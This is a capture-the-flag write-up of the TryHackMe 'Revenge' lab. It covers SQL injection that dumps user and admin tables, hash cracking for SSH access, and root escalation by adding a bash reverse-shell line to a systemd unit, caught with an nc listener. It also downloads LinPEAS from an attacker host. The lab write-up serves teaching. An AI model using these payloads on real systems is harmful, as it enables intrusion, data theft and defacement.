+++ 
draft = false
date = 2024-03-17T23:36:23Z
title = "Revenge"
description = ""
slug = ""
authors = ["Rxfa"]
tags = ["Medium", "TryHackMe", "Web"]
categories = ["Writeups"]
externalLink = ""
series = []
+++



# This is revenge! You've been hired by Billy Joel to break into and deface the Rubber Ducky Inc. web application. He was fired for probably good reasons but who cares, you're just here for the money. Can you fulfill your end of the bargain?

## Approach

### Reconnaissance & Enumeration

So, we start of by read the message Billy Joel left us to read and this is what we find:

```txt
To whom it may concern,

I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy 
and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  
I've done some initial enumeration of the site because I know *some* things about hacking but not enough.  
For that reason, I'll let you do your own enumeration and checking.

What I want you to do is simple.  Break into the server that's running the website and deface the front page.  
I don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.

When you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.  
Half up-front and half when you finish.

Good luck,

Billy
```

Sounds pretty simple:

- get into Rubber Ducky Inc's server
- deface their front page
- get the remaining 2500$

![Drake - Let's go](/gifs/lets-go.gif)

As it should be done in every CTF, we start by getting more information about the operating system and services that our target is running and our tool of choice for that is going to be Nmap.

```txt
Nmap scan report for 10.10.0.101
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.97 seconds
```

Our Nmap scan reveals SSH and HTTP services running on ports 22 and 80, respectively.

As I've said before, information is king and we need to try to make sure we don't miss any hidden directory or file, and the tool we use for that is Gobuster.

```txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.101
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2024/03/18 01:41:18 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 200) [Size: 4983]
/contact              (Status: 200) [Size: 6906]
/login                (Status: 200) [Size: 4980]
/static               (Status: 301) [Size: 194] [--> http://10.10.0.101/static/]
/products             (Status: 200) [Size: 7254]
/index                (Status: 200) [Size: 8541]
Progress: 23975 / 30001 (79.91%)[ERROR] 2024/03/18 01:47:29 [!] parse "http://10.10.0.101/error\x1f_log": net/url: invalid control character in URL
Progress: 29997 / 30001 (99.99%)
===============================================================
2024/03/18 01:49:19 Finished
===============================================================
```

Gobuster uncovers here a secret admin login page, suggesting potential avenues for exploitation.
But that quick turns out to be all bark and no bite, since the login form led to a dead link(same for the login page).

![admin page](/images/922381.png)

The two login pages we found lead us nowhere and we are running out of attack vectors as this application is very limited from the functionality standpoint.

We turn our attention to the products page and to the fact that it is possible look at each product in more detail, making it possible for us to try to find and exploit vulnerabilities such as [SQL Injections](https://portswigger.net/web-security/sql-injection), [Local File Inclusions](https://brightsec.com/blog/local-file-inclusion-lfi/) or [Insecure Direct Object References (IDORs)](https://portswigger.net/web-security/access-control/idor).

We start by trying to find out if there's a SQLi we can exploit, for that we run SQLmap that tells us that this web application is indeed vulnerable to SQL Injections and this is how we get our 1st flag.

```txt
Database: duckyinc
Table: user
[10 entries]
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| id | email                           | company          | username | _password                                                    | credit_card                |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |
| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | ************************** |
| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
```

![Vince Mcmahon GIF](/gifs/vince-mc-mahon-stacy-keibler.gif)

**Nice!**

There's not much we can do with the list of users of the website since all the login pages are dead, but there is this other table that gets our attention.

```txt
Database: duckyinc
Table: system_user
[3 entries]
+----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+
```

Going by the name of the table ~~and a user whose name is literally server-admin~~, we can assume that this is some kind of table of admins that have accounts in our target's machine.

So now we have in 3 hashes in hands that we can try to crack and then use to establish an SSH connection to our target(that is the only thing we can latch on to considering that all the login pages are dead).

With the help of hashcat we manage to crack server-admin's hash and are able to login in our target machine with those credentials.

### Initial Access

We are able to login as server-admin, And we get our 2nd flag.

```bash
server-admin@duckyinc:~$ ls
flag2.txt
server-admin@duckyinc:~$ cat flag2.txt 
*****************
```

We go to the /templates folder to deface Rubber Ducky Inc's front page just as our friend Billy asked us and find out that we do not have write permissions on any file of that folder.

```bash
server-admin@duckyinc:~$ ls -la /var/www/duckyinc/templates/
total 48
drwxr-x--- 2 flask-app www-data 4096 Mar 18 04:01 .
drwxr-x--- 5 flask-app www-data 4096 Mar 18 04:00 ..
-rw-rw---- 1 flask-app www-data  768 Aug  9  2020 404.html
-rw-rw---- 1 flask-app www-data  759 Aug  9  2020 500.html
-rw-rw---- 1 flask-app www-data 1231 Aug  9  2020 admin.html
-rw-rw---- 1 flask-app www-data 4509 Aug  9  2020 base.html
-rw-rw---- 1 flask-app www-data 3506 Aug  9  2020 contact.html
-rw-r--r-- 1 root      www-data   16 Mar 18 04:01 index.html
-rw-rw---- 1 flask-app www-data 1225 Aug  9  2020 login.html
-rw-rw---- 1 flask-app www-data 1280 Aug  9  2020 product.html
-rw-rw---- 1 flask-app www-data 3654 Aug  9  2020 products.html
```

So it looks like we need to get root access to get our well-deserved 2500$.
Since we have no information on possible PE vectors we download LinPEAS from our machine to the target's.

```bash
rxfa@attacker:~/Desktop/CTFs$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
rxfa@attacker:~/Desktop/CTFs$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)...
```

```bash
server-admin@duckyinc$:~$cd /tmp
server-admin@duckyinc$:/tmp$ wget http://<attacker_ip>:8000/linpeas.sh
server-admin@duckyinc$:/tmp$ chmod 777 ./linpeas.sh & ./linpeas.sh
```

Thankfully, LinPEAS is able to point us in the right direction and points to us that we probably have a PE vector in the duckyinc service by using the sudoedit command

```bash
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for server-admin on duckyinc:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
(root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
```

So we know that duckyinc is a systemd service configuration file that manages a Gunicorn instance to serve Ducky inc web application. And we know that ~~fortunately~~ we edit the file as we please, so the play here is to change it so we inject a reverse shell payload in the service and get root access to the machine in that way.

This is how we edit the file:

```bash
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root
Group=www-data
WorkingDirectory=/var/www/duckyinc
ExecStart=/usr/local/bin/gunicorn --workers 3 --bind=unix:/var/www/duckyinc/duckyinc.sock --timeout 60 -m 007 app:app
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

ExecStartPost=/bin/bash -c "/bin/sh -i >& /dev/tcp/<attacker_ip>/<1234> 0>&1"

[Install]
WantedBy=multi-user.target
```

Now we just need to set up a listener.

```bash
rxfa@attacker:~/Desktop/CTFs$ nc -lnvp 1234
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on [::]:1234
Ncat: Listening on 0.0.0.0:1234
```

Now, we restart the duckyinc.service and have our reverse shell connecting back with our attacker machine.

```bash
server-admin@duckyinc:/tmp$ sudo systemctl daemon-reload
server-admin@duckyinc:/tmp$ sudo systemctl restart duckyinc.service
```

### Root Access

And there it is!

We got root access.

Now we can deface Ducky Inc's front page(which is done by changing the index.html file in the /templates folder in any way really) and get the last flag.

```bash
Ncat: Connection from 10.10.50.133:34254.
/bin/sh: 0: can't access tty; job control turned off
# cd /root
# ls
flag3.txt
# cat ./flag3.txt  
************************* 
```

With all objectives completed, including the defacement of the front page, we've successfully completed our mission and secured our reward.

This concludes our adventure in exacting revenge upon Rubber Ducky Inc., as commissioned by none other than Billy Joel.
